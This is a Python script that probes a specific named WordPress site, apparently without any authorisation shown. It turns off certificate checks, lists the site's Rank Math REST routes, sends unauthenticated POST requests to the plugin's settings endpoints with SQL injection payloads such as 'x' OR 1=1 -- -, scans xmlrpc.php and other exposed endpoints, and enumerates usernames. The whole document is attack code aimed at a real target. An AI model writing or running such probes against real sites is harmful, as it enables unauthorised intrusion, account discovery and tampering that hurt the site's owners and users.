import urllib.request, urllib.error, urllib.parse, ssl, json, re

ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
BASE="https://ofa377.com.tw"

def req(path, data=None, headers=None, method=None, follow=True, rawbody=None, ctype=None):
    h={"User-Agent":UA,"Accept":"*/*","Connection":"close"}
    if headers: h.update(headers)
    body=None
    if rawbody is not None:
        body=rawbody.encode() if isinstance(rawbody,str) else rawbody
        if ctype: h["Content-Type"]=ctype
    elif data is not None:
        body=json.dumps(data).encode(); h["Content-Type"]="application/json"
    url=BASE+path
    m=method or ("POST" if body else "GET")
    r=urllib.request.Request(url, data=body, headers=h, method=m)
    try:
        resp=urllib.request.urlopen(r, timeout=20, context=ctx)
        return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()

# 1. Enumerate Rank Math REST routes
print("=== Rank Math REST namespace: /wp-json/rankmath/v1/ ===")
s,h,b=req("/wp-json/rankmath/v1/")
print(f"ST={s}")
try:
    j=json.loads(b)
    if "routes" in j:
        for rt,info in sorted(j["routes"].items()):
            methods=",".join(info.get("methods",[]))
            print(f"  {methods:10} {rt}")
    else:
        print(b.decode(errors="ignore")[:500])
except:
    print(b.decode(errors="ignore")[:500])

# 2. Also the full wp-json route list for rankmath
print("\n=== Search rankmath routes in full /wp-json/ index ===")
s,h,b=req("/wp-json/")
try:
    j=json.loads(b)
    rm=[r for r in j.get("routes",{}) if "rankmath" in r.lower()]
    for rt,info in sorted(rm):
        methods=",".join(info.get("methods",[]))
        print(f"  {methods:12} {rt}   args={list(info.get('args',{}).keys())}")
except Exception as e:
    print("parse err:", str(e), b[:200])

# 3. Test Rank Math saveModule / saveSettings auth requirement
print("\n=== Rank Math unauth action tests (expect 401 if authed, 400/200 if not) ===")
tests=[
 ("/wp-json/rankmath/v1/saveModule", {"module_key":"seo","data":{}}),
 ("/wp-json/rankmath/v1/saveSettings", {"group":"analytics","data":{}}),
 ("/wp-json/rankmath/v1/saveModule", {"module_key":"seo'-- -","data":{}}),
 ("/wp-json/rankmath/v1/saveSettings", {"group":"x' OR 1=1 -- -","data":{}}),
]
for path,payload in tests:
    s,h,b=req(path, data=payload)
    bt=b.decode(errors="ignore")[:150]
    print(f"POST {path} {json.dumps(payload)[:40]} => ST={s} :: {bt}")

# 4. Probe other WP attack surfaces
print("\n=== Other WP attack surfaces ===")
paths=["/wp-json/","/wp-json/oembed/1.0/embed?url=https://ofa377.com.tw/","/wp-json/wp/v2/users",
 "/?rest_route=/wp/v2/users","/wp-json/wp/v2/posts?per_page=1","/wp-json/wp/v2/types",
 "/wp-json/elementor/v1/","/wp-json/blocks/v1/","/wp-json/wp/v2/settings",
 "/xmlrpc.php","/?author=1","/wp-admin/includes/image-editor.php"]
for p in paths:
    s,h,b=req(p)
    loc=h.get("Location","")
    print(f"{s:4} {p:55} len={len(b)} loc={loc}")

# 5. Check user enumeration
print("\n=== User enumeration ===")
for u in ["admin","editor","ofa","staff"]:
    s,h,b=req(f"/?author={u}" if False else "/wp-json/wp/v2/users?search="+u)
    print(f"search user '{u}': ST={s} {b.decode(errors='ignore')[:120]}")
